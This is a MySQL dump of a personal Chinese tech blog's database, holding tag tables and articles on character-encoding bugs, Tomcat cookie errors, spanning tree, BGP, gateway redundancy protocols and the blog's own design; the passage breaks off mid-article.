-- MySQL dump 10.13  Distrib 5.6.39, for Linux (x86_64)
--
-- Host: localhost    Database: myblog
-- ------------------------------------------------------
-- Server version	5.6.39

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `myblog`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `myblog` /*!40100 DEFAULT CHARACTER SET utf8 */;

USE `myblog`;

--
-- Table structure for table `label_relation`
--

DROP TABLE IF EXISTS `label_relation`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `label_relation` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tagId` int(11) DEFAULT NULL,
  `postId` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=130 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `label_relation`
--

LOCK TABLES `label_relation` WRITE;
/*!40000 ALTER TABLE `label_relation` DISABLE KEYS */;
INSERT INTO `label_relation` VALUES (1,27,6),(2,21,6),(3,18,6),(4,26,6),(8,32,7),(9,13,7),(10,35,7),(11,12,7),(12,3,49),(13,21,49),(14,3,50),(15,36,50),(16,31,50),(17,37,13),(18,13,13),(19,42,8),(20,41,8),(21,24,8),(22,2,16),(23,43,16),(24,42,16),(25,13,16),(26,44,51),(27,9,51),(28,12,51),(29,21,51),(30,33,51),(31,11,38),(32,41,38),(33,43,38),(34,20,37),(35,18,37),(36,19,37),(37,13,37),(38,20,52),(39,45,52),(40,12,52),(41,47,46),(42,46,46),(43,45,46),(44,13,46),(45,12,46),(46,47,29),(47,2,29),(48,46,53),(49,9,53),(50,1,53),(54,9,54),(55,49,54),(56,48,54),(57,25,54),(58,2,26),(59,26,26),(60,31,26),(61,19,26),(62,11,20),(63,13,20),(64,9,55),(65,31,55),(66,36,55),(67,31,56),(68,36,56),(69,33,56),(70,6,57),(71,16,57),(72,49,57),(73,11,58),(74,50,59),(75,28,59),(76,8,59),(77,24,59),(78,2,60),(79,20,60),(80,50,60),(81,19,61),(82,26,61),(83,21,61),(84,37,61),(85,13,61),(86,25,62),(87,19,62),(88,9,63),(89,48,63),(90,11,64),(91,48,64),(92,45,64),(93,9,65),(94,48,65),(107,51,79),(108,43,79),(109,47,79),(110,2,80),(111,26,80),(112,25,80),(113,36,81),(114,31,81),(115,1,81),(117,18,67),(118,27,67),(119,23,67),(120,18,66),(121,25,66),(122,9,82),(123,47,82),(124,13,45),(125,32,45),(126,33,45),(127,49,45),(128,27,83),(129,1,83);
/*!40000 ALTER TABLE `label_relation` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `labels`
--

DROP TABLE IF EXISTS `labels`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `labels` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(10) DEFAULT '',
  `number` int(11) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=52 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `labels`
--

LOCK TABLES `labels` WRITE;
/*!40000 ALTER TABLE `labels` DISABLE KEYS */;
INSERT INTO `labels` VALUES (1,'安全',3),(2,'应用',5),(3,'网络技术',2),(5,'云计算',0),(6,'游戏',1),(7,'硬件技术',0),(8,'操作系统',1),(9,'高级语言',7),(10,'多媒体',0),(11,'Web前端',4),(12,'数据库',4),(13,'设计模式',8),(16,'机器学习',1),(18,'技术无关',4),(19,'行业见闻',4),(20,'转载',3),(21,'IT哲学',4),(23,'新版本',1),(24,'每日Bug',2),(25,'程序人生',4),(26,'互联网',4),(27,'测试',3),(28,'移动端',1),(30,'微机原理',0),(31,'算法',5),(32,'字符编码',2),(33,'文件系统',3),(34,'数学',0),(35,'协议栈',1),(36,'底层原理',4),(37,'架构',2),(41,'浏览器',2),(42,'数据结构',2),(43,'经典逻辑',3),(44,'搜索引擎',1),(45,'优化',3),(46,'运维',2),(47,'服务器',4),(48,'自动化',4),(49,'通用模型',3),(50,'UI接口',2),(51,'虚拟化',1);
/*!40000 ALTER TABLE `labels` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_article`
--

DROP TABLE IF EXISTS `t_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `t_article` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(80) NOT NULL,
  `time` datetime DEFAULT '2017-09-18 00:00:00',
  `star` int(11) DEFAULT '0',
  `comment` int(11) DEFAULT '0',
  `visit` int(11) DEFAULT '0',
  `content` text,
  `length` int(11) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=84 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_article`
--

LOCK TABLES `t_article` WRITE;
/*!40000 ALTER TABLE `t_article` DISABLE KEYS */;
INSERT INTO `t_article` VALUES (6,'Hello World @1.0','2017-09-19 14:08:53',3,0,21,'### 全新上线!\r\n初始域名:\r\nwww.openidea.xin:8080/Blog\r\n(放心,一定会改的)\r\n初始版本1.0开始发射:\r\n- 每次小更新+0.1\r\n- 重大更新+1.0\r\n\r\n同时社区型网站www.openidea.xin或ikernel.xin(暂未解析)将同步更新.\r\n>stay strong\r\n\r\n###### 网站涉猎传统IT行业和部分新兴领域,主攻linux内核和发行版,javaEE,还有虚拟化技术等.\r\n原创技术博客1.0个人版,仅供欣赏,转载请联系本人或标明原链接谢谢\r\ncontact me before reship any of my article , thx for ur time :D\r\n\r\n微信id:jinhengyu12138\r\n\r\n特别感谢:\r\nhttps://github.com/JinHengyu/javaee-blog\r\n博客灵感来源于此\r\n\r\n在经历的渣浪服务器的颓废,CSDN博客的鬼畜(好吧,其实是我账号被\"关照\"),最终还是选择自建博客-----感谢阿里云,感谢oracle.',476),(7,'\"三点两段\"考虑编码的兼容','2017-09-21 14:54:28',2,0,25,'改编原博客的时候意外发现查找具体分类和标签的时候出现bug:中文无法显示,全变成问号..\r\ndebug之后发现是平台迁移造成的后果,原作者特意的写了一个方法,将中文编码转成utf8,但是新平台上,浏览器传过来的数据本来就是utf8的,所以编码的重写导致乱码;\r\n\r\n[解决方案]\r\n首先把那个方法给废了:\r\n>//解码 解决在URL传中文值出现的乱码问题\r\n		public static String pareCode(String str) throws UnsupportedEncodingException{\r\n			return new String(str.getBytes(\"ISO-8859-1\"),\"UTF-8\");			\r\n		}\r\n\r\n然后(其实我也被各种编码转换给搞乱了),为了杜绝后患,统一使用utf8,即在request和response中都指定utf8(高速浏览器),除此之外对接mysql的jdbc以及mysql的内置编码都通通utf8!!\r\n\r\n(之于windows下需要做一些修改才能正确交给终端显示:)\r\n>mysql> set character_set_results=utf8 ;\r\n\r\n所以我总结出了一种\"三点两段\"的思考顺序,这个所谓的三点就是\"浏览器\" \"服务器\" 和 \"数据库\"\r\n而两段指的就是这三个点之间的传输媒介.\r\n所有总共这些有5个位置需要我们考虑数据在这个位置的编码格式,其中三个点是数据存储时的字符编码格式,两个点指的是数据在传输的时候用什么编码格式存储.只要考虑周全了这5个要素,bug的问题一定迎刃而解,而任何乱码的现象都是由这5个要素中的一个或多个造成的.\r\n那我这个博客为例:\r\n- 浏览器:HTTP response头部的编码字段指明显示的格式\r\n- 浏览器发送到servlet:HTTP request头部确认一下是以特定编码发送的\r\n- 服务器内部:不用说了,各个对象之间转接都需要制定清楚\r\n- jdbc:需要在驱动上面制定编码\r\n- 数据库内部:不用说,5种内置编码,如果拎不清的话,全部utf8没问题',894),(8,'cookie异常之空格符,以及扩展','2018-01-10 17:37:55',1,0,19,'点赞的时候发现一个bug,即点完右上角的数字并没有增加,刷新后才出现(〃\'▽\'〃),所以寻找中间被中断的js函数,并查看异常:\r\n>java.lang.IllegalArgumentException: An invalid character [32] was present in the Cookie value\r\n\r\n求助google，了解到 An invalid character [32]  中32对应的编码是空格，Stack Overflow上的回答：This is due to Tomcat\'s cookie processing being changed to a RFC 6265 compliant implementation by default in 8.5, which does not allow space (character 32), among others. 我的tomcat版本正好最近刚升级到8.5.0(8.5以上的版本不再允许cookie对象中有空格),\r\n遂查找函数,并将空格改为其他的分隔符,如\'_\':\r\n>Cookie cookie = new Cookie(\"star_arti\" + id, System.currentTimeMillis() + \"_\");\r\n\r\n自古以来,空格符\" \"都是很尴尬的一个字符,不仅在cookie中被封杀,其他的地方比如url中,文件系统里还有表单处理中,空格都经常被无情地trim()掉,所以为了减少bug,还是少在数据结构中掺入空格吧.\r\n(◕ᴗ◕✿)\r\n',680),(9,'生成树算法终极解析 [上]','2018-01-14 14:24:24',0,0,7,'>也是两年前大一写的,现把它博客搬家过来...\r\n\r\n许多老师讲一个新协议时，总会“强制性”地给你灌输它的各种规则，导致许多学生死记硬背之后任然一脸懵逼。我当初听stp时 也是遗留了很多问题：比如为什么这么设计；这种机制为什么不能这样改进；如果这么这么的话，会怎么怎么样。太多的不理解导致我的记忆效率大大降低。所以我 希望可以从一个协议的起源，开发的目地，设计师的想法（框架），分类分层地来叙述一种优秀的机制，并且提出它的局限性。\r\n\r\n![这里写图片描述](http://s3.sinaimg.cn/large/00688cvOzy730LIk8vM92&690)\r\n\r\n\r\n\r\n这是一个纯交换层网络的拓扑图（先不考虑主机）。\r\n\r\n此拓扑图表面上是一个物理图，但它可以包含许多逻辑无环图。（即pvst，稍后会讲）\r\n\r\n（每个交换机上都可以连若干个PC，任意两个PC之间通讯都经过其中的某条路径。）\r\n\r\n（请读者学习生成树逻辑时都把想象建立在一张足够大的拓扑图上，因为深刻的理解是基于实用性而产生的而不要死记它的机制）\r\n\r\n生成树协议stp（spanning tree protocol）是工作在交换层交换机上的一种防环机制（！！！！！！同时提供冗余）。交换机路径的备份使得环路的出现。因为交换层相对网络层规模较小，才允许广播的存在。（路由器分割广播域而交换机不能）（广播加上环路才形成了广播风暴，因而网络层虽有环路但不需要生成树）\r\n\r\n    建议拿pt模拟器做试验。快速生成树协议rstp（rapid spanning tree protocol）较stp优越些。因rstp与stp机制基本相似，且交换机默认开启rstp，本章重点研究rstp。\r\n\r\n众所周知顾名思义，一棵物理树的树枝是不会形成环路的，因此一棵生成树的根桥（根网桥，交换机的前身）就是物理树的根节点，非根桥就是物理树的分支点或者树枝末端。以及之后的trunk link（树干链路）模式，他们都是可类比的。某个vlan（记作vlan x），所有开启了vlan x的交换机（且这些交换机相连）构成了一棵关于vlan x的生成树。\r\n\r\n！！生成树的原理：在众多交换机中选择一个作为根桥，其余在每个交换机上选择唯一的一条路径通向根桥，再将剩下不用的路径（链路）堵塞。\r\n\r\n！！生成树机制的目的：让二层交换机通电相连后在很短时间内自动收敛出一棵或多棵生成树。（这是stp的精髓所在）\r\n\r\n![这里写图片描述](http://s1.sinaimg.cn/large/00688cvOzy730ZrbMbuc0&690)\r\n\r\n    ',1105),(10,'深入BGP原理和思想 [上]','2018-01-14 14:45:29',0,0,4,'前言：学思科技术我想说，浅尝辄止，不是天才千万别深钻。和我研究高等数学一样，越深入就会发现越多的问题与不合理之处。尤其对于IT界，算法的最终解释权还是掌握在老外手中，所以对于有些细节，我们\"记住就好\"。\r\n\r\n       本文主要关于BGP的逻辑而不是具体实验，所以我就随便配了几幅图，大多还是文字哈。由于BGP太过复杂，本文只是第一部介绍作品，以后会有更新！\r\n\r\n       BGP边界网关协议（Border Gateway Protocol）是互联网上很重要的一个高层协议，被广泛应用于运营商网络的自制系统之间，以及与园区网络之间，实现不同网络之间的\"兼容\"。\r\n\r\n       网关（gateway）英文译作\"门口\"，就像海关一样，是整个系统通往外界的唯一出路（除非你是走私~）。在园区网中\"网关\"有不同的概念，网络也有不同层次之分。企业内部路由器可以作为本地介入网络（网段）的网关，而企业边界路由器可以作为整个自制网络的网关。\r\n\r\n       BGP边界网关协议就是这么一个凌驾于园区网络之上，实现与外部交流的机制。\r\n\r\n正因为BGP工作在IGP之上，本质的不同导致一些细节上的重要区别：\r\n\r\n       1.IGP路由器邻居之间必须是直连网络；BGP邻居不一定。\r\n\r\n       2.IGP邻居自动发现；BGP邻居手动指定。\r\n\r\n       3.同一个进程号的IGP（如eigrp）网络是连续的，即任意两个eigrp路由器之间至少有一条拓扑路径上全是eigrp路由器；而BGP只用在边界路由器上。\r\n\r\n       4.未启动eigrp的路由器不会转发eigrp消息（阻断eigrp网络）；而非BGP路由器被要求转发IGP的消息（正是这一点导致了路由黑洞，稍后说）。\r\n\r\n       5.IGP可以实现负载均衡；BGP默认不会。\r\n\r\n       除此之外，BGP与IGP之间是可以类比的！就像二维函数与三维函数之间的类比关系，这种不同网络层次的类比可以这样理解：\r\n\r\n       1.扩散能力：路由条目都能扩散到整个网络\r\n\r\n       2.一个BPG网络（联邦或互联网）是由若干个IGP网络组成。\r\n\r\n       3.IGP路由器身后是一个交换网络，BGP路由器身后是整个企业网（园区网），而企业网是由若干个交换网组成。\r\n\r\n       4.IGP网络中认为下一跳（或组成单元）是另一个路由器，BGP网络认为下一跳是下一个自制系统（正是这一点衍生出命令next-hop-self，稍后讲）。\r\n\r\n       由于国家管控严格，规定企业网络必须依赖互联网服务提供商（运营商ISP）接入互联网（世界各国都如此），运营商是互联网的骨干网之一，也是最为我们所熟知的电信、移动和联通。因此BGP与ISP密切相关。\r\n\r\n![这里写图片描述](http://s14.sinaimg.cn/large/00688cvOzy732jWMsr3bd&690)\r\n\r\n       当企业网只连接了一家运营商时，不需要启用BGP，CE端（client edge）只要做一个缺省路由并推向内部路由器，PE端（provider edge）做一个静态路由指向企业就好了。这种方案称为单宿（single homed）或双宿（dual homed）。但大型公司总是采用多宿方案（multihomed），即连接到两家以上的运营商来提高冗余性。多宿解决方案中可以有多种内网配置方案，但大多数公司会采用这种方案：\r\n\r\n       在每个CE之间的中转路径上全启动BGP，相互指定ibgp peer关系（并不是两两关联）。此时企业网（或者说每一个BGP路由器）成为互联网的一部分（连通性），然后任选一个BGP路由器通过底层动态路由协议将默认路由推向企业内部路由器，即default information originate这条命令。然后这个BGP路由器就会根据数据包的目的ip判断发给哪一个CE。（BGP也有默认信息源这条命令，旨在告诉其他AS，默认流量从我的AS走，但不实用）\r\n\r\n       这时会出现一个问题，即BGP的防环机制阻隔路由跟新的转发。因为BGP没有DUAL算法的防环性，也没有SPF算法的上帝视角，只采用了最原始的水平分割（split horizon），即从一个ibgp peer收到的更新包不许转发给另一个ibgp peer（与rip的水平分割不太一样）。为解决水平分割带来的问题，一个叫路由反射器（Route Reflector，RR）的东西开发出来。\r\n\r\n       AS内BGP路径上可以将某个或某几个路由器设置成RR，剩下的成为RR的客户机（但并不知道自己是客户机）。说白了就是手动设置哪些路由器能转发从ibgp peer发来的更新包。\r\n\r\n![这里写图片描述](http://s8.sinaimg.cn/large/00688cvOzy732jqRGnR07&690)',2073),(11,'路由环路大总结！[上]','2018-01-15 19:29:26',1,0,7,'一。前言：\r\n\r\n       \"人类的创造力与破坏力同样强大\"。互联网行业尤其是网络构建这一领域，从根本上一直存在着一个无奈之处：网络本可以设计的很简单，只要实现网络的连通性即可，甚至全互联，但就是因为要fight against\"天灾人祸\"，尤其是人祸，互联网才衍生出了纷繁复杂的路由协议和各种因特网服务，以及\"网络安全\"这个庞大的领域。这也是为什么说当今所有的网络通讯流量中，80%的资源都被浪费（用于承载路由消息，协议字段等信息），只有20%被用以有效数据的传输。\r\n\r\n \r\n\r\n防环机制就是在这样一个大背景下产生的。\r\n\r\n       环路出现在互联网的各个层面，不同环路的出现原因与解决方法也不同。通常网络环路分为第二层环路和第三层环路，所有环路的形成都是由目的路径不明确导致混乱而造成的。二层环路主要就是交换机广播流的恶性循环。\r\n\r\n       三层环路就复杂多了，通常由各种网络故障导致！！！也是本文研究的重点。笔者将三层环路分成三类：单链路环路、跨结点环路、区域/AS间环路。\r\n\r\n \r\n\r\n二。交换层广播流与生成树：\r\n\r\n       众所周知，交换网络是一个小型的本地接入网（LAN），所以二层交换机默认允许转发广播流（路由器则默认丢弃）。除了广播流，交换机查询mac地址表无果时会将数据帧从除接收接口外的所有接口发送出去。\r\n\r\n       所以最初，当三个交换机两两相连时，一个数据帧会在其中无限循环。生成树就是为了让交换网络中防环而出现的。由于具体的生成树工作原理过于复杂需另成文，在此只做介绍不做详解。\r\n\r\n       生成树最原始的版本是802.1d，也就是STP（Spanning Tree Protocol），但这个版本的标准是所有VLAN共用一个生成树，所以也叫CST（Common Spanning Tree）思科在此基础上增强了一下，发布了PVST+（Per Vlan Spanning Tree）。\r\n\r\n       802.1d的下一个版本是802.1w，也就是RSTP（Rapid STP），但还是共用生成树，搞不懂IEEE不长点记性。于是思科又搞了一下，发布了PVRST+。\r\n\r\n\r\n  ![这里写图片描述](https://image-store.slidesharecdn.com/8e7acfa5-2c31-472d-9cee-c556a77a1c32-original.jpeg)',1030),(12,'交换层网关协议大总结 [上]','2018-01-16 15:16:26',0,0,10,'##网关冗余与负载分担\r\n\r\n读这篇文档之前，请读者先理清有关的专业术语和名词，尤其其中的同义词和并列词。\r\n\r\n还要知道，人们之所以把计算机中的一些非常简单的逻辑复杂化，形成一个难以理解的协议，是由于“电脑实在没人脑聪明”，cpu对逻辑语言的计算能力实在有限，所以只能把一个简单逻辑拆分成更多更简单的逻辑让计算机识别。\r\n\r\n网关的概念在企业网中有多种含义，本章主要探索交换层（本地接入网）的网关。\r\n\r\n首跳冗余性协议FHRP（first hop redundancy protocols）包括：\r\n\r\n> 1.热备份路由器协议HSRP（hot standby router protocol）。\r\n> \r\n> 2.虚拟路由冗余协议VRRP(virtual router redundancy protocol)。\r\n> \r\n> 3.网关负载均衡协议GLBP（gateway load balancing protocol）。\r\n\r\n它们是工作在接入层与汇聚层（交换与路由）之间的网关路由器或多层交换机上的网关协议。其中HSRP和VRRP的功能机制基本相同但只能实现网关备份，GLBP既能备份网关又能均衡负载（充分利用资源）。\r\n\r\n先给大家普及一下需要用到的底层知识：\r\n\r\n一般来说，一个网段就是一个子网（即使某一主类网没划分子网，它也可以看成是一子网网段）。一般一个子网内有以下设备：若干个主机，若干个二层交换机，若干个网关（它们是分层的，即交换机连接主机和网关）。可以看出，一个子网网络属于交换层，在子网中流量是通过mac地址来“寻路”的（子网内的主机之间通讯前通过发送arp广播来获取对方mac），其中交换机帮助转发流量。当主机想要与子网外的PC或服务器通讯，它不需要知道对方的mac，只要知道该子网的网关mac（由arp获得）就行，将信息流量发给网关，剩下的事情交给网关解决就行（路由到其他子网）。所以一台主机刚开始需要知道自身ip地址，对方电脑ip地址以及网关ip地址这三个基本信息才能正常通讯。\r\n\r\n然后暂且先附上一张关于三个协议的表格（方便之后返回查看）：\r\n\r\n| HSRP| VRRP（模仿HSRP）| GLBP| \r\n| ------------- |:-------------:| -----:| \r\n| 思科私有RFC2281| IEEE标准RFC3768| 思科私有| \r\n| UDP1985| IP协议112（端口号）| UDP3222| \r\n| 224.0.0.2| 224.0.0.18（通告地址）| 224.0.0.102| \r\n| 每组通常2台网关| 最多16个网关| 最多4个网关| \r\n| 最多16组？| 最多255组（每个路由器）| 最多1024组| \r\n| 0000.0c07.acXX| 0000.5e00.01XX（虚拟mac）| 0007.b4XX.XXYY| \r\n| 1个活跃和备份（其余候选）| 1个主用，若干备用| 1个AVG若干AVF| \r\n| 一个ip一个mac| 一个ip一个mac| 一个ip多个mac| \r\n| 虚拟ip与接口ip不同| 虚拟ip可与接口ip相同| 虚拟ip与真接口ip不同| \r\n| 可追踪接口或对象| 只可追踪对象| 只可追踪对象| \r\n| 默认hello 3s，hold 10s| 默认hello 1s，有skew时间| 默认hello 3s，hold 10s| \r\n| 明文认证| 明/密文认证| 明文认证| \r\n\r\n好了，先来聊聊HSRP和VRRP。理想化的情况下子网中有一台路由器充当网关，它的一个接口的ip充当网关ip。为了防止单点故障，子网中又添加了几个备用网关（处于闲置状态）。为了使故障发生后其中一个备用网关能够自动切换成主用（活跃）网关，才诞生了这两个网关冗余协议。\r\n\r\n因为站在子网内的主机的角度，子网内只能存在一个网关，不然流量就不知道该发向哪一个网关了（不知为什么，交换层不能自动负载均衡，必须选出唯一的路径，而路由表中只要AD和metric相同就会出现负载均衡）（优先级相同就比较接口ip）。所以这个冗余机制的基本思想是：将多个路由器组合成一个虚拟网关（一个备份组），它有一个虚拟ip和一个虚拟mac。子网内的主机们只知道有一个（虚拟）网关的存在，并不知情真实网关的情况。而所有通往子网外的流量只经过这个组中的某一个路由器（竞选选出）。其余备份网关处于不工作状态但一直监听active/master的工作状态，在必要时刻替代它的角色。\r\n\r\nHSRP与VRRP的三个重要区别：\r\n\r\n> 一：HSRP组内通常只放2台网关，一台active一台standby，若不止两台，再添入的网关都保持在初始状态（可以给备份做备份，但客户难以接受）；VRRP中却有一台master和若干个backup。\r\n> \r\n> 二：备份组正常运行时active与standby之间默认间隔3秒相互发送hello包（包含：active信息，standby信息，自身信息，认证口令，时间参数等信息）（有点类似BPDU）（组播地址映射mac地址）以维护组内关系，而master默认间隔一秒向外发送hello包，backup只接收不发送。\r\n> \r\n> 三：standby的默认holdtime是3*3+1=10秒（可手动改），backup的默认holdtime=3*1+（skew）秒，其中skew=（256-priority）/256（取值范围0到1，与优先级反比）。！！注意，此区别与前两个区别有重要联系，以为HSRP组中只有一台standby，holdtime到期后自觉上任，但VRRP组中有多个backup，holdtime到期后并不要竞选出某一个去上任，因为优先级最大的backup的holdtime最小！\r\n\r\n此外HSRP默认关闭抢占而VRRP默认开启，所谓的的抢占机制就是确保备份组中优先级最大的网关成为active/master（前提是网关连接子网的接口没有出错，即可以向其他网关发送hello包）。在非抢占情况下备份网关收到active/master的hello包中更大的优先级也不会去抢占它。给一副拓扑图：\r\n![这里写图片描述](http://s9.sinaimg.cn/large/00688cvOzy73fr1HOAM48&690)',2628),(13,'简单谈一下博客的架构','2018-01-21 20:57:00',1,0,22,'此blog是基于javaEE的一个原创博客,创立于2017.9.19.\r\n```\r\njava web项目，实现mvc模式，没有使用到任何前端框架(bootstrap除外)，实现了首页预览，文章发布，点赞，评论，Markdown编辑器，分类，标签，阅读排行，时间轴，管理员管理博客，访客记录等, 当然对于游客来说只有驻足欣赏的作用。\r\n```\r\n- 博客的初始版本(1.0)用到的技术有jsp,servlet,mysql,bootstrap,html/css/js,ajax,json\r\n\r\n- 其中jsp技术用到了jstl标签库,el表达式和标准动作等,并没用使用纯java,便于日后扩展\r\n\r\n- 数据库连接池使用了c3p0 , 提供了mysql长连接 ,tomcat多线程的并发访问\r\n\r\n- 后端也没有任何框架,摒弃了庞大而臃肿的SSL框架(洁癖哈哈)\r\n\r\n- Markdown编辑器借用了editor.md源码\r\n\r\n整个服务器搭建在阿里云华东2区(上海)的一台vps, 因为网站架构和格局一直在变化,所以作者我也无惧暴露了这么多服务器技术细节,日后还可能为了适应团队合作而转向ASP.NET, 当然这是以后的事了, 会在日后的版本更新中明确说明的.同时还会介绍mysql的设计模式,mvc的设计,前端的设计.\r\n\r\n下一篇介绍博客的分类和标签机制.\r\n\r\n![](https://static.oschina.net/uploads/user/1862/3725933_100.jpg)',649),(14,'博客的架构2','2018-01-21 21:44:43',0,0,22,'经过小组讨论,所有技术类博文总共分为这么几大类:\r\n关于技术怎样分类可以参考这篇文章:\r\nhttp://blog.sina.com.cn/s/blog_14ecc0b640102x2i9.html\r\n\r\n- 安全\r\n	收录一些常见的网络攻防技术,系统安全技术.\r\n- 应用层\r\n	应用层的技术,包括常用app的使用和互联网服务\r\n- 网络技术\r\n	底层网络建设,关于网络层和传输层的一些协议\r\n- 编译原理\r\n	比较冷门的一个分类,包括汇编和x86/ARM指令集\r\n- 云计算\r\n	底层虚拟化技术,服务器集群,包括大数据,分布式算法,转载的比较多\r\n- 游戏\r\n	探讨一些游戏大作,市场,游戏引擎等等\r\n- 硬件技术\r\n	就是物理层的一些技术,通信原理和计算机组成原理\r\n- 操作系统\r\n	这是比较热门的一类,主要是linux内核和发行版的作文比较多\r\n- 高级语言\r\n	这个不用说了,主流语言和算法收集\r\n- 多媒体技术\r\n	包含各种媒体格式,外设,以及字符编码的知识\r\n- web技术\r\n	小编最喜欢的和将要从事的领域:前后端开发\r\n- 数据库\r\n	各种数据库的设计,开发和优化\r\n- 设计模式\r\n	包括各种语言,网站框架,甚至交互式风格的,架构,设计,美工与实现\r\n- 新领域\r\n	比较前沿的IT领域,比如AI,IPv6,物联网,区块链,甚至量子计算机等区别于传统行业的技术\r\n- 其他\r\n	\r\n	\r\n	\r\n除了分类,还有一个\'标签\'机制用来实现可扩展的分类方式,因为一篇文章可以拥有多个标签,但只属于一个类,此时不是按技术领域来分的,而是按照网站的部署逻辑生成的新的标签系统:\r\n\r\n- 一般技术类\r\n	用于和分类模式兼容\r\n- 技术无关\r\n	一些和内容技术无关但又有价值的博文\r\n- 行业见闻\r\n	用于收录一些行业新闻和发展趋势之类的说明文,没有广告或软文\r\n- 转载\r\n	专门标记所有的非原创文章(也包括改编的文章)\r\n- IT哲学思想\r\n	一些总结性的文章,描写了各个领域不通技术的共性,规律和经验,上升到哲学领域的宝贵思想\r\n- 新版本特性\r\n	此博客的每一个版本迭代的更新情况将呈现于此\r\n- 每日Bug\r\n	用于记录此网站开发时遇到的一些bug和解决方案\r\n- 程序人生\r\n	针对程序猿攻城狮等IT从业者的一些行业建议,职场规则,和一些自我修养和提高,等一些有利于身心健康的休闲文\r\n	\r\n	\r\n	\r\n#### 以上只是刚开始计划的所有分类和标签,以后的变化会在新版本特性中提到!以上只是刚开始计划的所有分类和标签,以后的变化会在新版本特性中提到!',1084),(15,'我是测试','2018-01-22 13:09:11',0,0,9,'this blog is a tester',21),(16,'浅谈分类与标签机制的特色','2018-01-22 13:09:57',2,0,29,' ####    每个***blog服务***提供商无论是新浪,csdn,博客园还是Blogger,都特工了博客分类和添加标签的功能,而标签机制又不只存在于博文,还存在一些公**共聊天室类**似的社交平台,比如微博话题,OSChina动弹,脸书动态,Twitter等等,那么分类机制和标签机制的区别是什么呢,首先最明显的一个就是:\r\n>类与内容体是一对多的关系\r\n\r\n>标签与内容体是多对多的关系\r\n\r\n## 数据库如何存储上述两种关系?\r\n文章的分类就是一个简单嵌套关系,对于关系型mysql,最外面肯定是按时间顺序存放的全部文章列表,同时有一个auto_increment的id,然后可以根据每一个分类建一个索引表(通过id)从而避免全表扫描.\r\n关于索引的哲学可以参考这篇:\r\n>http://blog.csdn.net/github_38885296/article/details/77854630\r\n\r\n标签机制就比较麻烦了,其实分类与标签可以类比java里面的**类与接口**:\r\n```\r\njava类我们都知道,一个子类只能有一个父类,但一个类可以有多个子类;刚开始只有类与对象机制的时候,java程序员还是用的不亦乐乎的,但是随着需求的增加,他们慢慢发现类已经无法满足所有需求 了, 比如一个Car类既要继承一个Vehicle类,又要属于Expensive父类.这种平行意义上的两种划分方式单继承是无法满足的**多继承**的需求的,所以好像从jdk7开始,支持多继承的接口正式支持,接口的出现打破了传统的经典嵌套理论,提供了更开放的多对多关系的存储方式和逻辑关系.\r\n```\r\n\r\n当然和接口不通的是,标签机制需要我们自己实现,有一种最简单暴力的方式是将所有**多对多**关系转化为**一对一**的关系,比如:\r\n![](https://image-store.slidesharecdn.com/4e9888e1-5873-4ad0-ad6d-1b2339a9f396-original.png)\r\n#### 图中双方各有3个单元,之间关系复杂,任务是多对多;\r\n#### 这个关系图中共有6条线,那么就可以转换成6个一对一的关系:\r\n![](https://image-store.slidesharecdn.com/e58e33ed-c63e-4c55-bbef-76b30bf75db1-original.png)\r\n\r\n于是关系型数据库表中只要存这样的一对一关系就可以了,非常清晰易懂.\r\n但是这样的缺陷也很明显,那就是经常需要全表扫描才能parse出完整的多对多关系,才能在显示出完整的标签分类图.\r\n##### 所以留一个疑问,有没有更好的方法来存储呢,如果你有请留言:D.\r\n\r\n\r\n2018-01-22 12:08:06 星期一',1182),(17,'用户上网有哪些心理需求?做一个排名! (上)','2018-01-22 16:09:39',0,0,3,'##学习创业文化，创造人生价值。\r\n\r\n我们都知道，互联网的出现解决了很多问题，完成了许多不可能的任务。人们日常工作生活的主线剧情总是围绕着最基本的物质需求，即产品服务和信息等。但随着人们物质条件不断改善，休闲时间不断扩充，需求重心也随之发生了微妙的变化（从人类学上叫做提高了对环境的要求），从基本的社会需求逐渐转向精神上的心理上的满足（比如用户体验）。\r\n\r\n这些就是看似不起眼的互联网心理学，但只有把握住用户的“非核心”需求才能助你的产品一步登天，或者让你白手起家在互联网上有一席之地。以下就是小编根据各大门户网站大数据以及对身边小伙伴的观察所总结出的最常见的14个网络用户心理需求的权重排名。其中既有很古老以前无法满足的心理也有新时代催生出的心理需求，而大多数都是在你闲暇时间里会选择干的事情，请大家认真看，有没有共鸣。\r\n\r\n \r\n\r\n>###前十个网络主要心理\r\n 